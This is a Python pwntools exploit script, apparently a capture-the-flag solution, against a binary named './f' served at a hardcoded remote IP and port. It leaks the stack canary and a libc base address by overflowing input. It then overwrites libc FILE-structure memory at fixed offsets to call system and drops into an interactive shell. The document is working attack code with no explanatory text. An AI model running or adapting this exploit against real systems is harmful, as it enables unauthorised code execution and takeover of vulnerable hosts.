#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '178.62.40.102'
port = 6002

binary = "./f"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new():
  pass

def edit():
  pass

def remove():
  pass

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil("> ")
  r.send("11111111")
  r.recvuntil("> ")
  r.send("11010110")
  r.recvuntil("> ")
  r.send("A"*0x89)
  r.recvuntil("A"*0x89)
  canary = u64(('\x00'+r.recv(7)).ljust(8,"\x00"))
  print "canary =" , hex(canary)
  r.recvuntil("> ")
  r.send("A"*0x98)
  r.recvuntil("A"*0x98)
  libc.address = u64(r.recv(6).ljust(8,"\x00")) -0x20830
  print "libc =",hex(libc.address)
  r.recvuntil("> ")
  r.send("11111111")
  r.recvuntil("> ")
  r.send("10110101")
  r.recvuntil("> ")
  r.sendline(str(libc.address+0x3c4918 + 1))
  r.recvuntil("> ")
  r.send("\x00")
  r.recvuntil("> ")
  r.send(p64(libc.address+0x3c4900)*4 + p64(libc.address+0x3c4900+0x1000))
  r.recvuntil("> ")

  r.send(str(libc.address + 0x18cd57).ljust(0x10,"\x00")+ p64(libc.address+0x3c4900)*2 + p64(libc.address+0x3c4900+0x1000) + p64(0)*6 + p64(0xffffffffffffffff) + 
        p64(0) + p64(libc.address + 0x3c6790) +  p64(0xffffffffffffffff) + p64(0) + p64(libc.address+0x3c49c0) +
        p64(0)*3 + p64(0xffffffff) + p64(0)*2 + p64(libc.address+0x3c36e0) +
        p64(0)*0x2a + p64(libc.symbols["system"]))
  #raw_input("@")
  #r.sendline(str(libc.address + 0x18cd57))
  

  r.interactive()

